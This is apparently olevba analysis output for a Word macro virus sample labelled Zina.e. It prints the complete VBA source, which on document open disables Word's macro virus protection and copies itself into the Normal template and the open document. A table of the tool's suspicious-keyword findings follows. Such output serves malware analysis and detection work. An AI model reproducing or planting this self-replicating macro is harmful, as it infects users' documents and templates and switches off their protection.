olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zina.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zina.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'String2K
Dim a23489245, b23489234, c76394729, d39848275, e72945601, f92038476
Dim g50385723, h84729645, i84729645, j40395423, k02391836, l20654583, m29387656
Dim n74359023, o09324687, p98734985, r90809564
Private Sub Document_Open()
Set a23489245 = Application.ActiveDocument: Set b23489234 = Application.NormalTemplate
Set c76394729 = ThisDocument: d39848275 = 1: Options.VirusProtection = (d39848275 - d39848275)
Set k02391836 = b23489234.VBProject.vbcomponents(d39848275).CodeModule
Set n74359023 = a23489245.VBProject.vbcomponents(d39848275).CodeModule
e72945601 = c76394729.VBProject.vbcomponents(d39848275).CodeModule.Lines(d39848275, _
c76394729.VBProject.vbcomponents(d39848275).CodeModule.countoflines)
If k02391836.Lines(d39848275, d39848275) <> "'String2K" Then
k02391836.deletelines d39848275, k02391836.countoflines
k02391836.addfromstring e72945601
End If
If n74359023.Lines(d39848275, d39848275) <> "'String2K" Then
n74359023.deletelines d39848275, n74359023.countoflines
n74359023.addfromstring e72945601
End If
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|P8W#                |50385723                                     |
|Hex String|@9T#                |40395423                                     |
|Hex String|)8vV                |29387656                                     |
+----------+--------------------+---------------------------------------------+

